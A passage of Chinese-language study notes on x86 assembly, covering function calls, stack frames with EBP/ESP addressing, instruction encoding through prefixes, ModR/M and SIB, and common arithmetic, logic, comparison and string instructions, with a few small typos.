<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADD ESP,4</span><br><span class="line">MOV EIP, [ESP-4]</span><br></pre></td></tr></table></figure>

<h3 id="10-函数"><a href="#10-函数" class="headerlink" title="10.函数"></a>10.函数</h3><h4 id="1-函数的执行与调用"><a href="#1-函数的执行与调用" class="headerlink" title="1.函数的执行与调用"></a>1.函数的执行与调用</h4><p><strong>调用函数时一般使用CALL指令：</strong>因为通过CALL指令，会把CALL的下一行地址压到堆栈中，此时执行完函数之后只需要使用RET指令，即可返回到CALL指令的下一行</p>
<p><img src="/2023/12/10/compilation/image-20231214200005208.png" alt="image-20231214200005208"></p>
<p>执行函数后：</p>
<p><img src="/2023/12/10/compilation/image-20231214200601922.png" alt="image-20231214200601922"></p>
<p><strong>在调用函数传参时，如果有10个参数怎么办，</strong>如果使用通用寄存器只有8个，则使用<strong>堆栈传参</strong></p>
<p>用过PUSH指令，向堆栈中压入参数，需要调用的时候，在函数中使用ESP寻找参数</p>
<p><img src="/2023/12/10/compilation/image-20231214203450368.png" alt="image-20231214203450368"></p>
<p><img src="/2023/12/10/compilation/image-20231214204753323.png" alt="image-20231214204753323"></p>
<p>因为CALL函数后，ESP会-4操作并寄存CALL的下一行的地址，所以使用ADD EAX, DWORD PTR DS:[ESP+立即数] 即可找到之前PUSH的参数</p>
<h4 id="2-堆栈平衡"><a href="#2-堆栈平衡" class="headerlink" title="2.堆栈平衡"></a>2.堆栈平衡</h4><p>在函数调用的时候，执行完CALL指令，会将下一行地址压入堆栈，此时进入了函数体，当函数在执行时，可能会PUSH一些值到堆栈中，此时ESP指向的地址就不是CALL的下一行地址，如果此时使用了RET指令，那么返回的地址错误，程序就会出错，也就是堆栈不平衡。</p>
<p>所以在函数执行完毕执行RET指令时，要保证ESP指向的地址是之前CALL指令执行后的下一行地址。</p>
<p><img src="/2023/12/10/compilation/image-20231214210900748.png" alt="image-20231214210900748"></p>
<h3 id="11-寻址"><a href="#11-寻址" class="headerlink" title="11.寻址"></a>11.寻址</h3><h4 id="1-ESP寻址"><a href="#1-ESP寻址" class="headerlink" title="1.ESP寻址"></a>1.ESP寻址</h4><p>当使用ESP寻址之前在函数体中又向堆栈中PUSH了值，就会使ESP寻址更加困难，而且在堆栈中暂存寄存器的值还需要POP，所以使用ESP寻址较繁琐。</p>
<p><img src="/2023/12/10/compilation/image-20231215160655838.png" alt="image-20231215160655838"></p>
<p><img src="/2023/12/10/compilation/image-20231215164449175.png" alt="image-20231215164449175"></p>
<h4 id="2-EBP寻址"><a href="#2-EBP寻址" class="headerlink" title="2.EBP寻址"></a>2.EBP寻址</h4><p>先将EBP保存起来，然后让EBP指向ESP的位置，将现在的ESP提升一块，也就划分出了一块新的堆栈，供当前程序(函数)使用。</p>
<p>当CALL函数时，继续向堆栈中压入数据，ESP会上下浮动，但是不会影响从EBP到ESP提升后的位置。从EBP到ESP提升的这一段空间就可以放置参数，那么参数就可以使用EBP来寻址。</p>
<h5 id="1-保存EBP"><a href="#1-保存EBP" class="headerlink" title="1.保存EBP"></a>1.保存EBP</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call 0x000000AA</span><br><span class="line"></span><br><span class="line">000000AA:  PUSH EBP // 将EBP之前的值存储起来</span><br></pre></td></tr></table></figure>

<p>此时，堆栈就会变成这样</p>
<img src="/2023/12/10/compilation/image-20231215162924185.png" alt="image-20231215162924185" style="zoom:67%;">

<h5 id="2-将EBP提升到ESP"><a href="#2-将EBP提升到ESP" class="headerlink" title="2.将EBP提升到ESP"></a>2.将EBP提升到ESP</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ebp, esp</span><br></pre></td></tr></table></figure>

<p>此时堆栈和栈指针变成这样：</p>
<img src="/2023/12/10/compilation/image-20231215163246352.png" alt="image-20231215163246352" style="zoom:67%;">

<h5 id="3-提升ESP栈顶指针"><a href="#3-提升ESP栈顶指针" class="headerlink" title="3.提升ESP栈顶指针"></a>3.提升ESP栈顶指针</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub esp 4*0x4</span><br></pre></td></tr></table></figure>

<p>使用sub就是将ESP指针向上移，使EBP向上到ESP腾出了一部分空间</p>
<p><img src="/2023/12/10/compilation/image-20231215164021815.png" alt="image-20231215164021815" style="zoom:67%;"><img src="/2023/12/10/compilation/image-20231215164146109.png" alt="image-20231215164146109"></p>
<h5 id="4-使用内存"><a href="#4-使用内存" class="headerlink" title="4.使用内存"></a>4.使用内存</h5><p>可以使用EBP栈指针寻找参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax dword ptr ss:[ebp+0x8]</span><br><span class="line">add eax dword ptr ss:[ebp+0xC]</span><br></pre></td></tr></table></figure>

<h5 id="5-恢复内存"><a href="#5-恢复内存" class="headerlink" title="5.恢复内存"></a>5.恢复内存</h5><p>将ESP返回到EBP的位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV ESP, EBP</span><br></pre></td></tr></table></figure>

<img src="/2023/12/10/compilation/image-20231215163246352.png" alt="image-20231215163246352" style="zoom:67%;">

<p>此时EBP不用了，就把EBP取回</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POP EBP</span><br></pre></td></tr></table></figure>

<p>弹出后EBP后ESP会指向之前存EBP的内存地址</p>
<p>此时堆栈就恢复到了EBP寻址前的样子</p>
<h5 id="6-RET-立即数"><a href="#6-RET-立即数" class="headerlink" title="6.RET 立即数"></a>6.RET 立即数</h5><p>因为CALL之前压入了参数，所以用RET 立即数  进行堆栈平衡</p>
<p><strong>EBP寻址总过程：</strong></p>
<p><img src="/2023/12/10/compilation/image-20231215171758535.png" alt="image-20231215171758535"></p>
<h3 id="12-JCC"><a href="#12-JCC" class="headerlink" title="12.JCC"></a>12.JCC</h3><h4 id="1-标志寄存器EFLAGS"><a href="#1-标志寄存器EFLAGS" class="headerlink" title="1.标志寄存器EFLAGS"></a>1.标志寄存器EFLAGS</h4><p> <img src="/2023/12/10/compilation/image-20231215205900615.png" alt="image-20231215205900615"></p>
<h3 id="13-硬编码"><a href="#13-硬编码" class="headerlink" title="13.硬编码"></a>13.硬编码</h3><h4 id="1-指令编码（硬编码）的结构"><a href="#1-指令编码（硬编码）的结构" class="headerlink" title="1.指令编码（硬编码）的结构"></a>1.指令编码（硬编码）的结构</h4><p><img src="/2023/12/10/compilation/image-20231216230528497.png" alt="image-20231216230528497"> </p>
<h4 id="2-反汇编引擎（x32dbg-DTDebug"><a href="#2-反汇编引擎（x32dbg-DTDebug" class="headerlink" title="2.反汇编引擎（x32dbg , DTDebug"></a>2.反汇编引擎（x32dbg , DTDebug</h4><p>将硬编码转换成汇编语言，或将汇编语言转换成硬编码</p>
<p><img src="/2023/12/10/compilation/image-20231216231259394.png" alt="image-20231216231259394"></p>
<h4 id="3-前缀指令"><a href="#3-前缀指令" class="headerlink" title="3.前缀指令"></a>3.前缀指令</h4><img src="/2023/12/10/compilation/image-20231218140943554.png" alt="image-20231218140943554" style="zoom:50%;">

<p>看上面的结构图，最后面有一个(optional)，说明指令前缀是可选的。CPU判断一个指令是前缀还是OPcode，通过值来判断。</p>
<p>反汇编引擎会在前缀指令后面加一个冒号来区分。但是，实际上在exe中并没有这个冒号</p>
<p><img src="/2023/12/10/compilation/image-20231218141423898.png" alt="image-20231218141423898"></p>
<p>前缀指令是分组的，前缀指令最多四个，每组最多一个</p>
<img src="/2023/12/10/compilation/image-20231218141946019.png" alt="image-20231218141946019" style="zoom:50%;">

<h5 id="（1）LOCK和REPEAT前缀指令"><a href="#（1）LOCK和REPEAT前缀指令" class="headerlink" title="（1）LOCK和REPEAT前缀指令"></a>（1）LOCK和REPEAT前缀指令</h5><p><strong>LOCK</strong>					F0，用来锁地址总线，如果在一个地址上加上LOCK，如果在同一时刻有多个CPU核执行这条指令，只能有一个核可以读取这个地址，其他核不能读取这个地址。这条指令在多核下才有用，单核没有什么作用</p>
<p><strong>REPNE&#x2F;REPNZ</strong>	F2<br>                                   这两个指令，当EFLAGS寄存器的ZF位为0的时候执行上面的ZF位为1时执行下面的<br><strong>REP&#x2F;REPZ</strong>			F3</p>
<h5 id="（2）段（段寄存器）前缀指令-操作系统、内核程序"><a href="#（2）段（段寄存器）前缀指令-操作系统、内核程序" class="headerlink" title="（2）段（段寄存器）前缀指令  &#x3D;&gt; 操作系统、内核程序"></a>（2）段（段寄存器）前缀指令  &#x3D;&gt; 操作系统、内核程序</h5><p>CS(2E)、SS(36)、DS(3E)、ES(26)、FS(64)、GS(65)</p>
<p>如果不指定哪个段寄存器，则使用DS段寄存器；当寻址时出现了EBP、ESP时，默认使用的段寄存器是SS段寄存器</p>
<p>段寄存器就是指定寻址时，使用的段寄存器是谁</p>
<p>比如，当加上了前缀指令65，那么后面就会使用GS段寄存器</p>
<p><img src="/2023/12/10/compilation/image-20231218143744957.png" alt="image-20231218143744957"></p>
<h5 id="操作数宽度前缀指令-66"><a href="#操作数宽度前缀指令-66" class="headerlink" title="操作数宽度前缀指令 66"></a>操作数宽度前缀指令 66</h5><p>66</p>
<p>比如，当硬编码55 PUSH EBP 时，默认的是32位的EBP寄存器，如果想用16位的BP寄存器，则在前面加上前缀指令 66，用来改变操作数宽度。而如果当前CPU默认处于16位状态下，如果加上66前缀，那么操作数就会变成32位的EBP寄存器</p>
<p><img src="/2023/12/10/compilation/image-20231218145121846.png" alt="image-20231218145121846"></p>
<h5 id="地址宽度前缀指令-67"><a href="#地址宽度前缀指令-67" class="headerlink" title="地址宽度前缀指令 67"></a>地址宽度前缀指令 67</h5><p>当当前的寻址方式是32位的，当加上地址宽度前缀时，32位的寻址方式会变成16位寻址方式</p>
<p><img src="/2023/12/10/compilation/image-20231218151101155.png" alt="image-20231218151101155"></p>
<p><strong>总结：</strong>前缀指令最多四个，每组一个，一行指令可以添加多个前缀指令，前缀指令的顺序没有要求。</p>
<h4 id="4-定长指令与变长指令"><a href="#4-定长指令与变长指令" class="headerlink" title="4.定长指令与变长指令"></a>4.定长指令与变长指令</h4><p>Opcode：在硬编码结构中，其他的结构可以没有，但是opcode必须要有，opcode 可以是1byte 2byte 3byte<br>Opcode是一条指令中最重要的组成部分，后面的ModR&#x2F;M有没有由Opcode决定，SIB有没有由ModR&#x2F;M决定。</p>
<p>定长指令：当Opcode确定了，指令长度就确定了</p>
<p>变长指令：仅仅通过Opcode是无法确定长度的</p>
<h5 id="定长指令"><a href="#定长指令" class="headerlink" title="定长指令"></a>定长指令</h5><p><strong>经典定长指令：修改ERX（通用寄存器）</strong></p>
<p>1.PUSH&#x2F;POP  50<del>57,58</del>5F</p>
<img src="/2023/12/10/compilation/image-20231218193139403.png" alt="image-20231218193139403" style="zoom:67%;">

<p>2.INC&#x2F;DEC  40<del>47,48</del>4F</p>
<p>INC加一，DEC减一</p>
<img src="/2023/12/10/compilation/image-20231218193607613.png" alt="image-20231218193607613" style="zoom: 67%;">

<p>3.mov 寄存器, 立即数</p>
<img src="/2023/12/10/compilation/image-20231218195643211.png" alt="image-20231218195643211" style="zoom:67%;">

<p>4.XCHG 两个寄存器的值交换</p>
<img src="/2023/12/10/compilation/image-20231218201054537.png" alt="image-20231218201054537" style="zoom:67%;">

<p><strong>经典定长指令：修改EIP（CPU执行地址）</strong></p>
<p><img src="/2023/12/10/compilation/image-20231218205916589.png" alt="image-20231218205916589"></p>
<p><img src="/2023/12/10/compilation/image-20231218205936389.png" alt="image-20231218205936389"></p>
<p><img src="/2023/12/10/compilation/image-20231218210027620.png" alt="image-20231218210027620"></p>
<p><img src="/2023/12/10/compilation/image-20231218211305524.png" alt="image-20231218211305524"></p>
<h5 id="变长指令"><a href="#变长指令" class="headerlink" title="变长指令"></a>变长指令</h5><p>当opcode 后面有ModR&#x2F;M结构时，就是变长指令<br>重要的变长指令</p>
<p><img src="/2023/12/10/compilation/image-20231218220233910.png" alt="image-20231218220233910"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x88  MOV Eb, Gb</span><br><span class="line">0x89  MOV Ev, Gv</span><br><span class="line">0x8A  MOV Gb, Eb</span><br><span class="line">0x8B  MOV Gv, Ev</span><br><span class="line"></span><br><span class="line">G:通用寄存器 E:寄存器/内存</span><br><span class="line">b:字节	  v:Word, doubleword or quaword</span><br></pre></td></tr></table></figure>


<p>ModR&#x2F;M占一个字节，该字节的8个位被分成了三部分使用</p>
<p><img src="/2023/12/10/compilation/image-20231218220029004.png" alt="image-20231218220029004"></p>
<p>Mod(6,7位)和R&#x2F;M(0、1、2位) 共同描述指令中的E部分即寄存器或内存</p>
<p><img src="/2023/12/10/compilation/image-20231218222947497.png" alt="image-20231218222947497"></p>
<p>ModR&#x2F;M中间部分第3、4、5位，用来描述Reg&#x2F;Opcode也就是指令中的G部分，即寄存器</p>
<p><img src="/2023/12/10/compilation/image-20231218220731549.png" alt="image-20231218220731549"></p>
<p>比如一个硬编码 <strong>88 01</strong></p>
<p>88：MOV Eb, Gb</p>
<p>01：00 000 001 第3、4、5位是000，查表能得到EAX&#x2F;AL。因为G后面跟的b，所以是8位的AL。		现在的指令就是MOV Eb, AL</p>
<p>再查表，Mod：00，R&#x2F;M：001，对应的寄存器是ECX						所以，指令就变成了	<strong>MOV BYTE PTR DS:[ECX], AL</strong></p>
<h5 id="ModR-M结构"><a href="#ModR-M结构" class="headerlink" title="ModR&#x2F;M结构"></a>ModR&#x2F;M结构</h5><p><img src="/2023/12/10/compilation/image-20231218223845586.png" alt="image-20231218223845586"></p>
<p>1.Mod与R&#x2F;M共同描述E的意义（内存或者通用寄存器）</p>
<p>2、Reg&#x2F;Opcode描述了G的意义（通用寄存器）。但3-5字段，并不仅仅用来标识寄存器，有些时候，用来标识Opcode。</p>
<p>拆一个编码 80 65</p>
<p>65：   01   					100 					  101<br>       Mod:01		Reg&#x2F;Opencode			R&#x2F;M:101</p>
<p>根据Mod R&#x2F;M查出byte ptr ds:[ebp+dis8], Ib</p>
<p>当查表时看到Grp，就要去查Table A-6</p>
<p><img src="/2023/12/10/compilation/image-20231218231619393.png" alt="image-20231218231619393"></p>
<p>Table A-6：</p>
<p><img src="/2023/12/10/compilation/image-20231218235421168.png" alt="image-20231218235421168"></p>
<p>查表A-2能得到100对应的是AND指令，所以，80 65对应的汇编就是AND byte ptr ds:[ebp+dis8], Ib</p>
<p>但是发现这条指令里面还有一个8位的地址偏移DIS8，一个立即数Ib，所以后面还应该有两个值。</p>
<p><img src="/2023/12/10/compilation/image-20231219140855744.png" alt="image-20231219140855744"></p>
<h5 id="定长指令-SIB"><a href="#定长指令-SIB" class="headerlink" title="定长指令 SIB"></a>定长指令 SIB</h5><img src="/2023/12/10/compilation/image-20231219141132169.png" alt="image-20231219141132169" style="zoom:67%;">

<p>如一个指令 88 84 48</p>
<p>通过查表，88是MOV Eb, Gb		那么84就是ModR&#x2F;M。10      000       100<br>                                                                                        Mod     Reg      R&#x2F;M</p>
<p>Reg：AL		查表得Mod为00，01，10时，R&#x2F;M对应的是 [ – ] [ – ] 或 [ – ] [ – ] +disp8 或 [ – ] [ – ] +disp32</p>
<p>那么这里的[ – ] [ – ]就是由SIB决定的，因此48就是SIB。</p>
<p><strong>SIB的指令结构：</strong><br><img src="/2023/12/10/compilation/image-20231219142642622.png" alt="image-20231219142642622"></p>
<p><img src="/2023/12/10/compilation/image-20231219142743116.png" alt="image-20231219142743116"></p>
<p>48： 01         001       000			&#x3D;&gt; 	<strong>查Table2-3</strong><br>       scale	 index	 base</p>
<p><img src="/2023/12/10/compilation/image-20231219143038753.png" alt="image-20231219143038753"></p>
<p><img src="/2023/12/10/compilation/image-20231219143145855.png" alt="image-20231219143145855"></p>
<p>查base是000，所以是[EAX]</p>
<p>再找scale 和 index ，是[ECX * 2]</p>
<img src="/2023/12/10/compilation/image-20231219143700233.png" alt="image-20231219143700233" style="zoom:50%;">

<p>所以48对应的SIB就是[ EAX + ECX * 2 ]</p>
<p>因此，88 84 48对应的汇编代码就是MOV BYTE PTR DS:[ EAX + ECX * 2 + DIS32], AL</p>
<p>因为还有一个32位的地址偏移，所以88 84 48后面还会跟着四个字节</p>
<p><img src="/2023/12/10/compilation/image-20231219144356636.png" alt="image-20231219144356636"></p>
<h3 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h3><p>堆栈的本质就是一块内存，在程序启动之初就分配好了，给程序执行的之后使用。任何一个程序用到的关键数据都存在堆栈里。</p>
<p>栈是一种<strong>后进先出</strong>的数据结构</p>
<h4 id="1-ESP和EBP"><a href="#1-ESP和EBP" class="headerlink" title="1.ESP和EBP"></a>1.ESP和EBP</h4><p>ESP栈顶指针，它表示当前这块堆栈用到哪里了。ESP上面的堆栈是还未使用的堆栈。</p>
<p>EBP是栈底指针，这个栈底指针不是指堆栈的最底部，而是当前这一段代码(函数)的栈底（本层call的栈底）</p>
<h4 id="2-PUSH、POP-堆栈操作指令"><a href="#2-PUSH、POP-堆栈操作指令" class="headerlink" title="2.PUSH、POP  堆栈操作指令"></a>2.PUSH、POP  堆栈操作指令</h4><p>PUSH就是把数据传入到堆栈，POP就是把数据从堆栈中取出来</p>
<p>PUSH是压栈，POP是从栈顶取出一个值</p>
<h4 id="3-PUSHAD和POPAD"><a href="#3-PUSHAD和POPAD" class="headerlink" title="3.PUSHAD和POPAD"></a>3.PUSHAD和POPAD</h4><p>PUSHAD：将所有寄存器压入堆栈<br>POPAD：将所有寄存器从堆栈中还原</p>
<h4 id="4-堆栈平衡"><a href="#4-堆栈平衡" class="headerlink" title="4.堆栈平衡"></a>4.堆栈平衡</h4><p>  在函数调用的时候，执行完CALL指令，会将下一行地址压入堆栈，此时进入了函数体，当函数在执行时，可能会PUSH一些值到堆栈中，此时ESP指向的地址就不是CALL的下一行地址，如果此时使用了RET指令，那么返回的地址错误，程序就会出错，也就是堆栈不平衡。</p>
<p>  所以在函数执行完毕执行RET指令时，要保证ESP指向的地址是之前CALL指令执行后的下一行地址。</p>
<p>  还有一种情况就是当在函数调用中向堆栈中PUSH了数据（如：PUSH 1，PUSH 2），但是调用完函数之后，0x00000001和0x00000002没有用了，占了两个堆栈空间，这也是堆栈不平衡。</p>
<p>  在CALL函数之后，内平栈或外平栈</p>
<h3 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h3><p>调用约定规定了两个东西：</p>
<ol>
<li>函数的参数入栈顺序(从左到右还是从右到左)</li>
<li>参数平栈的方式(内平栈外平栈)</li>
</ol>
<h2 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h2><h3 id="1-MOV指令-1"><a href="#1-MOV指令-1" class="headerlink" title="1.MOV指令"></a>1.MOV指令</h3><p>MOV 寄存器, 寄存器<br>MOV 寄存器, 内存<br>MOV [内存地址], 寄存器<br>MOV [内存地址], 立即数<br>MOV 寄存器, 立即数</p>
<h3 id="2-MOVZX指令"><a href="#2-MOVZX指令" class="headerlink" title="2.MOVZX指令"></a>2.MOVZX指令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV EAX, 0xFFFFFFFF</span><br><span class="line">MOV AL, 0x11</span><br><span class="line">MOVZX EAX, AL</span><br></pre></td></tr></table></figure>

<p>1.将AL赋值给EAX，EAX的值就等于FFFFFF11<br>2.零扩展，其他位清零</p>
<p>所以EAX最后等于 0x00000011</p>
<h3 id="3-LEA指令"><a href="#3-LEA指令" class="headerlink" title="3.LEA指令"></a>3.LEA指令</h3><p>取地址		LEA 寄存器, [内存地址]</p>
<p><img src="/2023/12/10/compilation/image-20231220200534314.png" alt="image-20231220200534314"></p>
<h3 id="4-XCHG指令-交换指令"><a href="#4-XCHG指令-交换指令" class="headerlink" title="4.XCHG指令  交换指令"></a>4.XCHG指令  交换指令</h3><p>交换两个数据</p>
<p>XCHG EAX, EBX	&#x3D;&gt;	交换EAX和EBX中的值</p>
<p><img src="/2023/12/10/compilation/image-20231220201144745.png" alt="image-20231220201144745"></p>
<h3 id="5-运算指令"><a href="#5-运算指令" class="headerlink" title="5.运算指令"></a>5.运算指令</h3><h4 id="1-ADD指令-加法指令"><a href="#1-ADD指令-加法指令" class="headerlink" title="1.ADD指令  加法指令"></a>1.ADD指令  加法指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADD 操作数1, 操作数2</span><br><span class="line">操作数1 += 操作数2</span><br></pre></td></tr></table></figure>

<p>将操作数2加到操作数1</p>
<p>ADD指令不能使用 内存+内存；ADD会影响到进位标志位CF位：无符号整数发生溢出时被置1</p>
<p><img src="/2023/12/10/compilation/image-20231220202709803.png" alt="image-20231220202709803"></p>
<h4 id="2-ADC指令-进位加指令"><a href="#2-ADC指令-进位加指令" class="headerlink" title="2.ADC指令  进位加指令"></a>2.ADC指令  进位加指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADC 操作数1, 操作数2</span><br></pre></td></tr></table></figure>

<p>将操作数2加到操作数1，再加上进位标志位</p>
<p><img src="/2023/12/10/compilation/image-20231220203846632.png" alt="image-20231220203846632"></p>
<h4 id="3-SUB指令-减法指令"><a href="#3-SUB指令-减法指令" class="headerlink" title="3.SUB指令  减法指令"></a>3.SUB指令  减法指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SUB 操作数1, 操作数2</span><br><span class="line">操作数1 -= 操作数2</span><br></pre></td></tr></table></figure>

<p>SUB指令也会影响到CF进位标志位，当SUB借位时，CF位也会被置1</p>
<h4 id="4-SBB指令-进位减指令"><a href="#4-SBB指令-进位减指令" class="headerlink" title="4.SBB指令  进位减指令"></a>4.SBB指令  进位减指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SBB 操作数1, 操作数2</span><br></pre></td></tr></table></figure>

<p>将操作数1减去操作数2，再减去CF进位标志位</p>
<h4 id="5-INC指令-自增指令"><a href="#5-INC指令-自增指令" class="headerlink" title="5.INC指令  自增指令"></a>5.INC指令  自增指令</h4><p>自增指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV EAX, 0x0</span><br><span class="line">INC EAX ----------&gt; EAX=0x1</span><br></pre></td></tr></table></figure>

<h4 id="6-DEC指令-自减指令"><a href="#6-DEC指令-自减指令" class="headerlink" title="6.DEC指令  自减指令"></a>6.DEC指令  自减指令</h4><p>自减指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV EAX, 0x1</span><br><span class="line">DEC EAX ----------&gt; EAX=0x0</span><br></pre></td></tr></table></figure>

<h4 id="7-MUL指令-无符号乘法指令"><a href="#7-MUL指令-无符号乘法指令" class="headerlink" title="7.MUL指令  无符号乘法指令"></a>7.MUL指令  无符号乘法指令</h4><p>MUL是单操作数指令	隐藏乘数时EAX</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV EAX, 0x1234</span><br><span class="line">MOV EBX, 0x10</span><br><span class="line">MUL EBX ----------&gt; EAX = 0x12340</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/10/compilation/image-20231220205507636.png" alt="image-20231220205507636"></p>
<h4 id="8-IMUL指令-有符号乘法指令"><a href="#8-IMUL指令-有符号乘法指令" class="headerlink" title="8.IMUL指令  有符号乘法指令"></a>8.IMUL指令  有符号乘法指令</h4><p>IMUL是双操作数指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV EAX, 0x20</span><br><span class="line">MOB EBX, 0x2</span><br><span class="line">IMUL EAX, EBX ----------&gt; EAX = 0x40</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/10/compilation/image-20231220205751946.png" alt="image-20231220205751946"></p>
<p>会影响到OF溢出标志位：有符号数产生溢出时，OF位被置1</p>
<h4 id="9-DIV指令-无符号除法指令"><a href="#9-DIV指令-无符号除法指令" class="headerlink" title="9.DIV指令  无符号除法指令"></a>9.DIV指令  无符号除法指令</h4><p>除法的概念</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5 / 3 = 1 ... 2</span><br></pre></td></tr></table></figure>

<p>5是被除数，3是除数，1是商，2是余数</p>
<p><img src="/2023/12/10/compilation/image-20231220211810092.png" alt="image-20231220211810092"></p>
<h4 id="10-IDIV指令-有符号除法指令"><a href="#10-IDIV指令-有符号除法指令" class="headerlink" title="10.IDIV指令  有符号除法指令"></a>10.IDIV指令  有符号除法指令</h4><p>与无符号除法基本一样</p>
<h3 id="6-位运算"><a href="#6-位运算" class="headerlink" title="6.位运算"></a>6.位运算</h3><h4 id="1-AND指令-与运算指令"><a href="#1-AND指令-与运算指令" class="headerlink" title="1.AND指令  与运算指令"></a>1.AND指令  与运算指令</h4><p>操作数1,：reg&#x2F;mem<br>操作数2：reg&#x2F;mem&#x2F;imm</p>
<p>操作：将操作数1与操作数2进行按位与运算，结果存到操作数1中</p>
<h4 id="2-OR指令-或运算指令"><a href="#2-OR指令-或运算指令" class="headerlink" title="2.OR指令 或运算指令"></a>2.OR指令 或运算指令</h4><p>操作数1,：reg&#x2F;mem<br>操作数2：reg&#x2F;mem&#x2F;imm</p>
<p>操作：将操作数1与操作数2进行按位或运算，结果存到操作数1中</p>
<h4 id="3-XOR指令-异或运算指令"><a href="#3-XOR指令-异或运算指令" class="headerlink" title="3.XOR指令  异或运算指令"></a>3.XOR指令  异或运算指令</h4><p>操作数1,：reg&#x2F;mem<br>操作数2：reg&#x2F;mem&#x2F;imm</p>
<p>操作：将操作数1与操作数2进行按位异或运算，结果存到操作数1中</p>
<h4 id="4-NOT指令-非运算指令"><a href="#4-NOT指令-非运算指令" class="headerlink" title="4.NOT指令  非运算指令"></a>4.NOT指令  非运算指令</h4><p>操作数1,：reg&#x2F;mem<br>操作数2：reg&#x2F;mem&#x2F;imm</p>
<p>操作：将操作数1与操作数2进行按位非运算，结果存到操作数1中</p>
<h4 id="5-SHL指令-左移-LEFT-指令"><a href="#5-SHL指令-左移-LEFT-指令" class="headerlink" title="5.SHL指令  左移(LEFT)指令"></a>5.SHL指令  左移(LEFT)指令</h4><p>操作数1：reg<br>操作数2：imm&#x2F;CL</p>
<p>操作：左移 （乘2^n）</p>
<h4 id="6-SHR指令-右移-RIGHT-指令"><a href="#6-SHR指令-右移-RIGHT-指令" class="headerlink" title="6.SHR指令  右移(RIGHT)指令"></a>6.SHR指令  右移(RIGHT)指令</h4><p>操作数1：reg<br>操作数2：imm&#x2F;CL</p>
<p>操作：右移（除以2^n）</p>
<h3 id="7-比较指令"><a href="#7-比较指令" class="headerlink" title="7.比较指令"></a>7.比较指令</h3><p>逻辑运算都不会得到运算结果，仅仅设置标志寄存器中的相应标志位，同行&#x3D;&#x3D;通常都是配合跳转指令，实现汇编中的选择或者循环结构</p>
<h4 id="1-CMP指令"><a href="#1-CMP指令" class="headerlink" title="1.CMP指令"></a>1.CMP指令</h4><p>CMP用于比较两个数的大小</p>
<p>操作数1：reg<br>操作数2：reg&#x2F;mem&#x2F;imm<br>指令结构：CMP 操作数1，操作数2<br>执行操作：用操作数1减去操作数2，并根据结果设置EFLAGS寄存器中的状态标志<br>                  不会设置结果，只会根据结果设置标志寄存器中的值</p>
<p>SF符号位（第七位）：设置成结果的最高位，也就是带符号位中的符号位（0表示正数，1表示负数）</p>
<p>ZF零标志位（第六位）：当运算结果为0时，该标志位被置1</p>
<p>PF奇偶标志位（第二位）：当结果的最低字节中1的个数为偶数（最后的运算结果为偶数）时置1，否则置0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV EAX, 0x1</span><br><span class="line">CMP EAX, 0x1</span><br></pre></td></tr></table></figure>

<p>执行CMP指令，EAX会被减1，但是运算后的值不会赋值给EAX<br>执行后，EAX运算的值是0，因此，ZF位被置1</p>
<p>当两数相等时，CMP两个数，ZF位和PF位都会被置1。<br>当EAX中的值小于后面的数时，EAX-IMM为负数，所以SF符号位会被置1</p>
<h4 id="2-TEXT指令"><a href="#2-TEXT指令" class="headerlink" title="2.TEXT指令"></a>2.TEXT指令</h4><p>最常用的功能就是测试某个寄存器的值是不是0</p>
<p>操作数1：reg<br>操作数2：reg&#x2F;mem&#x2F;imm<br>指令结构 TEST 操作数1，操作数2<br>执行操作：将操作数1和操作数2进行按位与运算，并根据结果设置SF ZF PF状态标志，然后丢弃结果</p>
<p>一般会写：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TEST EDX, EDX</span><br><span class="line">TEST EAX, EAX</span><br><span class="line">TEST ECX, ECX</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>用来判断某个寄存器中的值是否为0。当某个寄存器中的值为0时，ZF位会被置1</p>
<h3 id="8-串操作指令"><a href="#8-串操作指令" class="headerlink" title="8.串操作指令"></a>8.串操作指令</h3><h4 id="1-MOVS指令-将ESI地址指向的内存复制到EDI指向的内存中"><a href="#1-MOVS指令-将ESI地址指向的内存复制到EDI指向的内存中" class="headerlink" title="1.MOVS指令  将ESI地址指向的内存复制到EDI指向的内存中"></a>1.MOVS指令  将ESI地址指向的内存复制到EDI指向的内存中</h4><p>之前的MOV指令不允许MOV内存到内存；MOVS指令可以从一个内存地址移动到另一个内存地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOVS BYTE PTR ES:[EDI], BYTE PTR DS:[ESI] ----------&gt; 简写:MOVSB</span><br><span class="line">MOVS WORD PTR ES:[EDI], WORD PTR DS:[ESI] ----------&gt; 简写:MOVSW</span><br><span class="line">MOVS DWORD PTR ES:[EDI], DWPRD PTR DS:[ESI] ----------&gt; 简写:MOVSD</span><br></pre></td></tr></table></figure>

<p>前面是目的操作数dest（ [EDI] ），后面是源操作数src（ [ESI] ）</p>
